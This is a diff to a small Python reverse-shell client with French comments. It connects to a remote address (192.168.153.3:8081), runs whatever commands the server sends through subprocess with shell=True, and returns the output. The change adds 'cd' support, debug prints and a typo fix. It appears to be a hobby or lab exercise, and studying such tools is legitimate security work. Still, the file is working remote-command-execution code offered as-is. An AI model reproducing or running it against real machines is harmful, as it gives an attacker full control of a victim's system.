@@ -1,12 +1,12 @@
 from copy import error
-from http import client
+import os
 import socket
 import time
 from time import sleep
 import subprocess
 
-PORT = 8888
-IP = '127.0.0.1'
+PORT = 8081
+IP = '192.168.153.3'
 
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -16,7 +16,7 @@ while 1:
     try:
         s.connect((IP, PORT))
     except ConnectionError:
-        print("Connexion au server inpossible...")
+        print("Connexion au server impossible...")
         time.sleep(5)
         continue
     
@@ -26,21 +26,29 @@ while 1:
 
 while 1:
 
-    response = s.recv(1024)
+    response = s.recv(1024).decode()
     
     if response != "":
                 response_list = response.split()
-
+                print("RECU", response_list)
+                
+                # si la commande est un "cd"
+                if len(response_list) == 2 and response_list[0] == "cd":
+                    os.chdir(response_list[1])
+                    response_list = ["pwd"]
+                    print("result" , response_list)
+                
+                
                 try:
                     result = subprocess.run(response_list, shell=True, capture_output=True, text=True, )
                     
                     # si il le canal stdrerr (erreur) n'est pas vide
                     if result.stderr != "":
-                        response = result.stdout + "\n\nERREUR: " + result.stderr
+                        to_serv = result.stdout + "\n\nERREUR: " + result.stderr
                     else: 
-                        response = result.stdout
+                        to_serv = result.stdout
                 except:
-                    response = "ERREUR INNATTENDU",  error
+                    to_serv = "ERREUR INNATTENDU",  error
 
-    
-    s.sendall(response.encode())
+    print("ENVOIE TO SERVV: " + to_serv)
+    s.sendall(to_serv.encode())
